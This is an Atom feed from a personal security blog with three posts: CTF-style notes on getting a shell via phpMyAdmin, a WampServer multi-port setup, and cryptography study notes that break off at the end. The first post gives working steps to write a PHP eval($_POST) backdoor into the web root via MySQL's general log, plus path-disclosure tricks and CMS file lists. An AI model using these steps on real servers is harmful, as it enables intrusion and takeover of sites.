<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Two_smi1e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.twosmi1e.com/"/>
  <updated>2018-10-11T08:07:57.863Z</updated>
  <id>https://www.twosmi1e.com/</id>
  
  <author>
    <name>two_smi1e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpmyadmin getshell姿势</title>
    <link href="https://www.twosmi1e.com/2018/10/11/phpmyadmin-getshell%E5%A7%BF%E5%8A%BF/"/>
    <id>https://www.twosmi1e.com/2018/10/11/phpmyadmin-getshell姿势/</id>
    <published>2018-10-11T07:19:34.000Z</published>
    <updated>2018-10-11T08:07:57.863Z</updated>
    
    <content type="html"><![CDATA[<p>遇到好多题都是找到phpadmin后台是弱口令，可以登进去是root权限，但是有时总是不知道该怎么getshell，这里总结一下。</p><h2 id="0x00-常规方法"><a href="#0x00-常规方法" class="headerlink" title="0x00 常规方法"></a>0x00 常规方法</h2><p>最常见的应该就是<code>select into outfile</code>写入shell了，但是很有可能失败。</p><p>phpMyadmin执行以下命令：<br><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><br><img src="/2018/10/11/phpmyadmin-getshell姿势/1539007881000.png" alt="Alt text"><br>如果值为文件夹目录，则只允许修改目录下的文件，如果值为NULL则为禁止。<br>并且这个值是只读变量，只能通过配置文件修改。</p><h2 id="0x01-利用日志写shell"><a href="#0x01-利用日志写shell" class="headerlink" title="0x01 利用日志写shell"></a>0x01 利用日志写shell</h2><h3 id="检测全局变量-general-log、general-log-file"><a href="#检测全局变量-general-log、general-log-file" class="headerlink" title="检测全局变量(general_log、general_log file)"></a>检测全局变量(general_log、general_log file)</h3><ol><li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li><li>general log file 指的是日志的保存路径。</li></ol><p><img src="/2018/10/11/phpmyadmin-getshell姿势/1539008583989.png" alt="Alt text"><br>由图可知<code>general_log</code>默认关闭，以及日志的存储路径</p><p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在D:\wamp64\bin\mysql\mysql5.7.14\data\下的一个log文件中，其实就是我们常说的日志文件。好，我们的利用的思路是开启general_log之后把general_log_file的值修改为我们网站默认路径下一个自定义的php文件中，然后我们通过log日志进行写入一句话后门到上面去，然后再进一步利用。<br>具体命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">set global general_log = &quot;ON&quot;;</div><div class="line">set global general_log_file=&apos;D:/wamp64/www/infos.php&apos;;</div></pre></td></tr></table></figure></p><p><img src="/2018/10/11/phpmyadmin-getshell姿势/1539015902813.png" alt="Alt text"><br>执行后可以看到生成的伪日志文件infos.php<br>此时在利用日志的记录插入一句话<br><code>select &#39;&lt;?php eval($_POST[smi1e]);?&gt;&#39;;</code><br>打开日志可以看到记录<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1539016064932.png" alt="Alt text"><br>然后尝试用菜刀连接即可getshell</p><h2 id="0x02-php爆绝对路径方法"><a href="#0x02-php爆绝对路径方法" class="headerlink" title="0x02 php爆绝对路径方法"></a>0x02 php爆绝对路径方法</h2><p>上述操作是需要网站的绝对路径的，所以总结一下爆路径的方法</p><h3 id="单引号爆路径"><a href="#单引号爆路径" class="headerlink" title="单引号爆路径"></a>单引号爆路径</h3><p>说明：<br>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br>www.xxx.com/news.php?id=149′</p><h3 id="错误参数值爆路径"><a href="#错误参数值爆路径" class="headerlink" title="错误参数值爆路径"></a>错误参数值爆路径</h3><p>说明：<br>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br>www.xxx.com/researcharchive.php?id=-1</p><h3 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h3><p>说明：<br>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。<br>Site:xxx.edu.tw warning<br>Site:xxx.com.tw “fatal error”</p><h3 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h3><p>说明：<br>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br>www.xxx.com/test.php<br>www.xxx.com/ceshi.php<br>www.xxx.com/info.php<br>www.xxx.com/phpinfo.php<br>www.xxx.com/php_info.php<br>www.xxx.com/1.php</p><h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>说明：<br>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</p><ol><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpMyAdmin/index.php?lang[]=1</li><li>/phpMyAdmin/phpinfo.php</li><li>load_file()</li><li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li><li>/phpmyadmin/libraries/select_lang.lib.php</li><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpmyadmin/libraries/mcrypt.lib.php</li></ol><h3 id="配置文件找路径"><a href="#配置文件找路径" class="headerlink" title="配置文件找路径"></a>配置文件找路径</h3><p>说明：<br>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</p><p>Windows:<br>c:\windows\php.ini php配置文件<br>c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</p><p>Linux:<br>/etc/php.ini php配置文件<br>/etc/httpd/conf.d/php.conf<br>/etc/httpd/conf/httpd.conf Apache配置文件<br>/usr/local/apache/conf/httpd.conf<br>/usr/local/apache2/conf/httpd.conf<br>/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</p><h3 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h3><p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br>www.xxx.com/xx.jpg/x.php</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h4><p>/member/templets/menulit.php<br>plus/paycenter/alipay/return_url.php<br>plus/paycenter/cbpayment/autoreceive.php<br>paycenter/nps/config_pay_nps.php<br>plus/task/dede-maketimehtml.php<br>plus/task/dede-optimize-table.php<br>plus/task/dede-upcache.php</p><p>####WP<br>wp-admin/includes/file.php<br>wp-content/themes/baiaogu-seo/footer.php</p><h4 id="ecshop商城系统暴路径漏洞文件"><a href="#ecshop商城系统暴路径漏洞文件" class="headerlink" title="ecshop商城系统暴路径漏洞文件"></a>ecshop商城系统暴路径漏洞文件</h4><p>/api/cron.php<br>/wap/goods.php<br>/temp/compiled/ur_here.lbi.php<br>/temp/compiled/pages.lbi.php<br>/temp/compiled/user_transaction.dwt.php<br>/temp/compiled/history.lbi.php<br>/temp/compiled/page_footer.lbi.php<br>/temp/compiled/goods.dwt.php<br>/temp/compiled/user_clips.dwt.php<br>/temp/compiled/goods_article.lbi.php<br>/temp/compiled/comments_list.lbi.php<br>/temp/compiled/recommend_promotion.lbi.php<br>/temp/compiled/search.dwt.php<br>/temp/compiled/category_tree.lbi.php<br>/temp/compiled/user_passport.dwt.php<br>/temp/compiled/promotion_info.lbi.php<br>/temp/compiled/user_menu.lbi.php<br>/temp/compiled/message.dwt.php<br>/temp/compiled/admin/pagefooter.htm.php<br>/temp/compiled/admin/page.htm.php<br>/temp/compiled/admin/start.htm.php<br>/temp/compiled/admin/goods_search.htm.php<br>/temp/compiled/admin/index.htm.php<br>/temp/compiled/admin/order_list.htm.php<br>/temp/compiled/admin/menu.htm.php<br>/temp/compiled/admin/login.htm.php<br>/temp/compiled/admin/message.htm.php<br>/temp/compiled/admin/goods_list.htm.php<br>/temp/compiled/admin/pageheader.htm.php<br>/temp/compiled/admin/top.htm.php<br>/temp/compiled/top10.lbi.php<br>/temp/compiled/member_info.lbi.php<br>/temp/compiled/bought_goods.lbi.php<br>/temp/compiled/goods_related.lbi.php<br>/temp/compiled/page_header.lbi.php<br>/temp/compiled/goods_script.html.php<br>/temp/compiled/index.dwt.php<br>/temp/compiled/goods_fittings.lbi.php<br>/temp/compiled/myship.dwt.php<br>/temp/compiled/brands.lbi.php<br>/temp/compiled/help.lbi.php<br>/temp/compiled/goods_gallery.lbi.php<br>/temp/compiled/comments.lbi.php<br>/temp/compiled/myship.lbi.php<br>/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php<br>/includes/modules/cron/auto_manage.php<br>/includes/modules/cron/ipdel.php</p><h4 id="ucenter爆路径"><a href="#ucenter爆路径" class="headerlink" title="ucenter爆路径"></a>ucenter爆路径</h4><p>ucenter\control\admin\db.php</p><h4 id="DZbbs"><a href="#DZbbs" class="headerlink" title="DZbbs"></a>DZbbs</h4><p>manyou/admincp.php?my_suffix=%0A%0DTOBY57</p><h4 id="z-blog"><a href="#z-blog" class="headerlink" title="z-blog"></a>z-blog</h4><p>admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</p><h4 id="php168爆路径"><a href="#php168爆路径" class="headerlink" title="php168爆路径"></a>php168爆路径</h4><p>admin/inc/hack/count.php?job=list<br>admin/inc/hack/search.php?job=getcode<br>admin/inc/ajax/bencandy.php?job=do<br>cache/MysqlTime.txt</p><h4 id="PHPcms2008-sp4"><a href="#PHPcms2008-sp4" class="headerlink" title="PHPcms2008-sp4"></a>PHPcms2008-sp4</h4><p>注册用户登陆后访问<br>phpcms/corpandresize/process.php?pic=../images/logo.gif</p><h4 id="bo-blog"><a href="#bo-blog" class="headerlink" title="bo-blog"></a>bo-blog</h4><p>PoC:<br>/go.php/&lt;[evil code]<br>CMSeasy爆网站路径漏洞<br>漏洞出现在menu_top.php这个文件中<br>lib/mods/celive/menu_top.php<br>/lib/default/ballot_act.php<br>lib/default/special_act.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;遇到好多题都是找到phpadmin后台是弱口令，可以登进去是root权限，但是有时总是不知道该怎么getshell，这里总结一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-常规方法&quot;&gt;&lt;a href=&quot;#0x00-常规方法&quot; class=&quot;headerlink&quot; title=&quot;0
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>WampServer多端口配置</title>
    <link href="https://www.twosmi1e.com/2018/10/04/WampServer%E5%A4%9A%E7%AB%AF%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
    <id>https://www.twosmi1e.com/2018/10/04/WampServer多端口配置/</id>
    <published>2018-10-03T16:49:05.000Z</published>
    <updated>2018-10-03T16:50:25.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>做项目有的文件必须放在网站根目录，于是需要配置多端口，找了网上几种方法都没成功，记下最后成功的办法。</p><h2 id="0x01-修改http-conf"><a href="#0x01-修改http-conf" class="headerlink" title="0x01  修改http.conf"></a>0x01  修改http.conf</h2><p>在监听端口处加<code>Listen 端口号</code><br>example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#Listen 12.34.56.78:80</div><div class="line">Listen 0.0.0.0:90</div><div class="line">Listen [::0]:90</div><div class="line">Listen 9090</div></pre></td></tr></table></figure></p><h2 id="0x02-开启虚拟站点"><a href="#0x02-开启虚拟站点" class="headerlink" title="0x02 开启虚拟站点"></a>0x02 开启虚拟站点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Virtual hosts </div><div class="line">#Include conf/extra/httpd-vhosts.conf</div></pre></td></tr></table></figure><p>去掉注释符  修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Virtual hosts </div><div class="line">Include conf/extra/httpd-vhosts.conf</div></pre></td></tr></table></figure></p><h2 id="0x03-配置conf-extra-httpd-vhosts-conf"><a href="#0x03-配置conf-extra-httpd-vhosts-conf" class="headerlink" title="0x03 配置conf/extra/httpd-vhosts.conf"></a>0x03 配置conf/extra/httpd-vhosts.conf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:9090&gt;</div><div class="line">ServerName test01.com</div><div class="line">DocumentRoot D:/demo/test01</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure><p>最后重启 访问端口就行了<br>更详细的配置版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:8082&gt; </div><div class="line">ServerAdmin webmaster@dummy-host.localhost </div><div class="line">DocumentRoot &quot;C:/PhpDocRoot/Site1&quot; </div><div class="line">ServerName localhost </div><div class="line">ServerAlias localhost </div><div class="line">ErrorLog &quot;logs/dummy-host.localhost-error.log&quot; </div><div class="line">CustomLog &quot;logs/dummy-host.localhost-access.log&quot; common </div><div class="line">&lt;Directory &quot;C:/PhpDocRoot/Site1&quot;&gt; </div><div class="line">Options Indexes FollowSymLinks </div><div class="line">AllowOverride None </div><div class="line">Order allow,deny </div><div class="line">Allow from all </div><div class="line">&lt;/Directory&gt; </div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;做项目有的文件必须放在网站根目录，于是需要配置多端口，找了网上几种方法都没成功，记下最后成功的办法。
      
    
    </summary>
    
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
      <category term="编程相关" scheme="https://www.twosmi1e.com/tags/%E7%BC%96%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>密码学</title>
    <link href="https://www.twosmi1e.com/2018/09/06/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>https://www.twosmi1e.com/2018/09/06/密码学/</id>
    <published>2018-09-06T05:26:06.000Z</published>
    <updated>2018-10-11T08:02:21.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="密码学体制"><a href="#密码学体制" class="headerlink" title="密码学体制"></a>密码学体制</h3><p>1.明文空间M（全体明文的集合）<br>2.密文空间C（全体密文的集合）<br>3.密钥空间K（全体密钥的集合）<br>4.加密器或加密变换（算法）E<br>5.揭秘其或解密变换（算法）D<br>&#123;M，C，K，E，D&#125;称为一个密码体制</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>按执行的操作方式不同可分为替换密码体制和换位密码体制<br>按收发双方使用的密钥是否相同可分为对称密码和非对称密码<br>分组密码和序列密码<br>单项变换密码体制和双向变换密码体制<br>确定型密码体制和概率密码体制</p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul><li>唯密文攻击：已知一些密文和加密算法</li><li>已知明文攻击：已知一些密文和加密算法以及对应的明文</li><li>选择明文攻击：已知加密算法，选择明文得到相应密文，也可选择被加密的明文推导密钥和算法</li><li>选择密文攻击：已知加密算法，选择不同的密文以及相应的被解密的明文</li><li>选择文本攻击：明文与密文结合，前两种方法的结合</li></ul><p>唯密文攻击最难，攻击强度递增。一个密码体制安全通常指在前三种攻击下安全</p><p>RSA：能抵御选择明文<br>AES：能抵御已知明文<br>DES：密钥太短，不能抵御已知</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>仿射密码是一种替换密码<br>k和26互质</p><p>i为明文 j为明文<br>（1）加密变换为：Ek0，k1（ai）=aj，j=（ik1+ k0）（mod n），k0 ,k1∈Zn，gcd(k1，n)=1；<br>（2）解密变换为：Dk0，k1（aj）=ai，i= k1<sup>-1</sup>（j-k0）（mod n），k0 ,k1∈Zn，gcd(k1，n)=1，其中：k1-1是k1关于n的逆元，即k1-1×k1＝1 (mod n)<br>（3）k1，k0为该算法的密钥。当k0=0时，仿射密码技术退化为乘法密码技术；当k0=1时，仿射密码技术退化为移位替换密码技术。<br><img src="/2018/09/06/密码学/1526881719267.png" alt="Alt text"></p><h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>（1）加密<br>明文M=(m1, m2, …, mn)被分为长度为d的字母段，如果消息的长度恰好不是d的倍数，则在末尾填充随机字符。加密函数为：<br>Ek(m1, m2, …, mn)=((m1+k1) mod 26，(m2+k2) mod 26，…， (mn+kn)) mod 26  = c1, c2, …, cn</p><p>（2）解密<br>解密函数Dk和加密函数Ek一样，只是运算时使用的是减法而不是加法，假设密文C=(c1, c2, …, cn)，则解密函数为：<br>Dk(c1, c2, …, cn)=((c1-k1) mod 26，(c2-k2) mod 26，…，(cn-kn) mod 26 = m1, m2, …, mn<br><img src="/2018/09/06/密码学/1526882755939.png" alt="Alt text"><br>（3）密钥<br>对于Vigenere密码，密钥是一个字符序列k=( k1, k2, …, kn)，其中k1=k2= …= kn（它们是长度为d的英文字串），n为任意值。因此，在原理上存在无限多个密钥。在实际应用中，当密钥的长度比明文短时，密钥可以周期性地重复使用（即k=( k1, k2, …, kn)），直至完成明文中每个字母的加密。<br><img src="/2018/09/06/密码学/1526882774380.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526882789986.png" alt="Alt text"></p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h3><p>DES加密和解密是互逆的<br>DES的<strong>明文分组长度64 bits</strong>，密钥长度为64 bits，其中密钥有8 bits奇偶校验，因此<strong>有效密钥</strong>长度为<strong>56 bits</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">st=&gt;start: 64位明文</div><div class="line">e=&gt;end: 64位密文</div><div class="line">op1=&gt;operation: 初始置换IP</div><div class="line">op2=&gt;operation: 16轮乘积变换</div><div class="line">op3=&gt;operation: 逆初始置换IP^-1</div><div class="line"></div><div class="line"></div><div class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;e</div></pre></td></tr></table></figure></p><p><img src="/2018/09/06/密码学/1526902503466.png" alt="Alt text"></p><h4 id="IP置换"><a href="#IP置换" class="headerlink" title="IP置换"></a>IP置换</h4><p>IP置换表：<br><img src="/2018/09/06/密码学/1527074953574.png" alt="Alt text"></p><p><img src="/2018/09/06/密码学/1527074924697.png" alt="Alt text"></p><h4 id="S盒使用方法"><a href="#S盒使用方法" class="headerlink" title="S盒使用方法"></a>S盒使用方法</h4><p>接收6比特的输入，第1和最后1比特构成的2位二进制位行号，中间4位二进制位列号，查S盒得到输出并转化为二进制</p><h4 id="E盒扩展"><a href="#E盒扩展" class="headerlink" title="E盒扩展"></a>E盒扩展</h4><p>对输入的某些位进行复制和置换，将32 bits扩展为48 bits。<img src="/2018/09/06/密码学/1526902478091.png" alt="Alt text"></p><h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>DES-EDE2<br><img src="/2018/09/06/密码学/1526902435581.png" alt="Alt text"></p><p>DES-EEE2<br><img src="/2018/09/06/密码学/1526902401769.png" alt="Alt text"></p><p>EDE3，EEE3密钥长度为168bits  EDE2，EEE2为112bits</p><h3 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h3><p>限定了明文分组为128bits，而密钥长度可为128、192、256bits，因而实际上AES有三个版本：AES-128、AES-192、AES-256，相应的迭代轮数为10轮、12轮、14轮。<br><img src="/2018/09/06/密码学/1526902679329.png" alt="Alt text"><br>字节代替(SubBytes)：通过一个非线性的替换函数，用查找表（S盒）的方式把每个字节替换成对应字节（前4bit行值，后4bit列值）<br>行移位(ShiftRows)：将矩阵中每个横列进行循环式移位<br>列混合(MixColumns)：使用线性转换混合每行内的四个字节<br>轮密钥加(AddRoungKey)：矩阵中每个字节都与该次循环的子密钥做异或XOR运算</p><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p><img src="/2018/09/06/密码学/1526906503013.png" alt="Alt text"><br>首先初始密钥按照矩阵列进行分许，前4列记为$K_0$,$K_1$,$K_2$,$K_3$<br>1.若$K_i$中，i不是4的倍数，则<br>K<sub>i</sub> = K<sub>i-4</sub>XOR K<sub>i-1</sub><br>2.若$K_i$中，i是4的倍数，则<br>K<sub>i</sub>=K<sub>i-4</sub>XOR T[K<sub>i-1</sub>]</p><p>T[K<sub>i-1</sub>]:<br>1.循环地将K<sub>i-1</sub>的元素左移位，每次一个字节，如abcd-&gt;bcda；<br>2.将这4个字节作为S盒的输入，输出新的4个字节 efgh<br>3.计算一轮的常量r(i)=2<sup>(i-4)/4</sup><br>4.生成转换后的列：[e XOR r(i), f, g, h]</p><p>例： $𝑇(𝐾_3)$的计算步骤如下：<br>1）循环将$𝐾_3$按照字节为单位循环左移1字节，00 55 09 32变成55 09 32 00<br>2）将55 09 32 00作为S盒的输入，查表得到输出FC 01 23 63<br>3）查找Rcon表，$Rcon[i/ Nk]=Rcon[1]=01000000$<br>4）将01000000与FC 01 23 63异或运算得FD 01 23 63<br>因此$𝑇(𝐾_3 )$=&#123;FD 01 23 63&#125;</p><p><img src="/2018/09/06/密码学/1526908943971.png" alt="Alt text"></p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p><img src="/2018/09/06/密码学/1526906778038.png" alt="Alt text"></p><h4 id="AES字节基本运算"><a href="#AES字节基本运算" class="headerlink" title="AES字节基本运算"></a>AES字节基本运算</h4><p>AES算法的基本运算是在有限域$GF(2^8)$上的加与乘运算。AES算法构造有限域选择的不可约多项式是$p(x)=x^8+x^4+x^3+x+1$<br>余式的次数至多是7次，共28=256个多项式，这256个余式构成了一个有限域。<br><strong>重要规则：系数模2 模p(x)</strong></p><p><strong>X乘</strong><br>另外 GF(28)上域元素 x，用二进制表示为&#123;0000 0010&#125;。用十六进制表示为&#123;02&#125;.<br>因此若b7=0 ，可以得出x•b(x)的结果就是 b(x)对应的8bits二进制向左移一位，最后一位补0。<br><img src="/2018/09/06/密码学/1526910903114.png" alt="Alt text"></p><p>若b7=1, x•b(x)的结果就是b(x)对应的8bits二进制向左移一位，最后一位补0，再与&#123;1B&3125;（其二进制为00011011，多项式表示为x4+x3+x+1）做逐比特异或来实现。<br><img src="/2018/09/06/密码学/1526910914734.png" alt="Alt text"></p><h3 id="对称密码工作体制"><a href="#对称密码工作体制" class="headerlink" title="对称密码工作体制"></a>对称密码工作体制</h3><h4 id="ECB电子码本模式"><a href="#ECB电子码本模式" class="headerlink" title="ECB电子码本模式"></a>ECB电子码本模式</h4><p>ECB操作模式加密： $C_j=E_k(P_j)$<br>ECB操作模式解密： $P_j=D_k(C_j)$</p><p><img src="/2018/09/06/密码学/1526911074509.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526911078440.png" alt="Alt text"><br>（1）ECB运行模式在给定的密钥下，同一明文组总产生同样的密文组。<br>（2）无链接依赖性，各组的加密独立于其它分组，重排密文分组，将导致相应的明文分组重排。<br>（3）<strong>无错误传播</strong>，单个密文分组中有一个或多个比特错误只会影响该分组的解密结果。<br>（4）<strong>安全性有限</strong>，由于同一明文产生同样的密文，这会暴露明文数据的格式和统计特征。特别是若明文数据都有固定的格式（例如图像）或者并需要以协议的形式定义的数据，一些重要的数据常常在同一位置上出现，使密码分析者可以对其进行统计分析、重传和代换攻击。因此当消息长度超过一个组或者重复使用密钥加密多个单组消息，不建议使用ECB模式</p><h4 id="CBC密码分组链接模式"><a href="#CBC密码分组链接模式" class="headerlink" title="CBC密码分组链接模式"></a>CBC密码分组链接模式</h4><p>CBC操作模式加密： $C_j=E_K(C_j-1 ⊕P_j)$<br>CBC操作模式解密： $P_j=D_K(C_j) ⊕C_j-1$<br><img src="/2018/09/06/密码学/1526911566304.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526911576629.png" alt="Alt text"><br>（1）能够隐蔽明文数据的<strong>格式规律</strong>和<strong>统计特性</strong>，相同的明文分组产生不同密文分组。<br>（2）在一定程度上能够识别攻击者在密文传输中是否对数据进行了篡改，如组的重放、嵌入和删除等。<br>（3）CBC模式各密文分组不仅与当前明文组有关，而且通过反馈作用还与以前的明文组有关。在CBC模式下，最好是每发一个消息，都改变IV，比如将其值加一，这样即使是两个相同的明文使用相同的密钥，也将产生不同的密文，这样大大提供了安全性。但这样产生另外一个问题，接收端（解密方）如何知道使用的IV呢？实际上，<strong>IV的完整性要比其保密性更为重要</strong>。<br>（4）具有错误传播. 若在传送过程中，<strong>某组密文组Cj出错时，则会影响到分组Cj 和Cj+1 的解密</strong>, 即该组恢复的明文 和下一组 恢复数据出错。但后面的分组解密将不会受影响。<br>（5）在CBC模式中，密文分组若某些<strong>比特缺失</strong>（例如某些比特位没有收到等），那么即使密文分组中1 bit的缺失，也会导致后续密文分组都受缺失影响，从而此自缺失比特密文分组开始，后续密文分组全部受缺失影响，无法正常解密</p><h4 id="CFB密码反馈模式"><a href="#CFB密码反馈模式" class="headerlink" title="CFB密码反馈模式"></a>CFB密码反馈模式</h4><p><img src="/2018/09/06/密码学/1526911806064.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526911822585.png" alt="Alt text"><br>例：<br><img src="/2018/09/06/密码学/1526911892569.png" alt="Alt text"><br>（1）输入相同明文，改变IV会导致相同的明文输入得到不同的加密输出，<strong>IV无需保密</strong>。若待加密消息必须按字符(如电传电报)或按比特处理时，可采用CFB模式。CFB实际上是将加密算法DES作为一个密钥流产生器。CFB模式除能获得保密性外，<strong>对错误差错比较敏感</strong>，还能用于认证。<br>（2）CFB与CBC的区别是反馈的密文长度为j，且不是直接与明文操作，而是反馈至密钥产生器。解密采用相同方案，都使用加密函数而非解密函数。密文分组$𝐶<em>𝑖$依赖于$𝑃</em>𝑖$和前面的所有明文分组，因此正确的解密一个正确的密文分组需要之前的⌈𝑛/𝑗⌉个密文分组也都正确（<strong>确保移位寄存器是正确的</strong>）。<br>（3）在CFB模式中，明文有一组$𝑃<em>𝑖$中单个比特有错，会使以后的密文组都受影响，但经解密后的恢复结果，除原有误的一组外，其后各组明文都正确地恢复。<br>若在传送过程中，一个或多个比特错误出现在j比特的密文组$𝐶</em>𝑖$中，<strong>则会影响到分组</strong>$𝑪<em>𝒊$<strong>和后续⌈𝒏/𝒋⌉个密文分组的解密</strong>（直到nbits的密文被处理，在此之后出错的分组$𝐶</em>𝑖$完全移出移位寄存器）。例如对于8bits（1个字节）的加密，则会产生9字节的错误。</p><h4 id="OFB输出反馈模式"><a href="#OFB输出反馈模式" class="headerlink" title="OFB输出反馈模式"></a>OFB输出反馈模式</h4><p><img src="/2018/09/06/密码学/1526912300183.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526912307757.png" alt="Alt text"><br>（1）与CFB、CBC相同，输入相同明文，改变IV会导致相同的明文输入得到不同的密文输出。<br>  （2）OFB模式的传输过程中的<strong>比特错误不会被传播</strong>。例如$𝐶<em>𝑖$中出现一个或多个比特错误，在解密结果中只有$𝑃</em>𝑖$受到影响，以后各明文分组则不受影响。但与CFB模式相比，<strong>更易受到对消息流的篡改攻击</strong>，比如在密文中取1bit的补，那么在恢复的明文中相应位置的比特也为原比特的补。因此使得敌手有可能通过对消息校验部分的篡改和对数据部分的篡改，而以纠错码不能检测的方式篡改，因此对于密文被篡改难以进行检测，无法实现完整性检测。</p><h4 id="CTR计数器模式"><a href="#CTR计数器模式" class="headerlink" title="CTR计数器模式"></a>CTR计数器模式</h4><p>CTR操作模式加密： $O_i=E_k(CTR+i-1)，C_i=O_i⊕P_i$<br>CTR操作模式解密：$O_i=E_k(CTR+i-1) ，P_i=O_i⊕ C_i$</p><p><img src="/2018/09/06/密码学/1526917146239.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526917135624.png" alt="Alt text"></p><h2 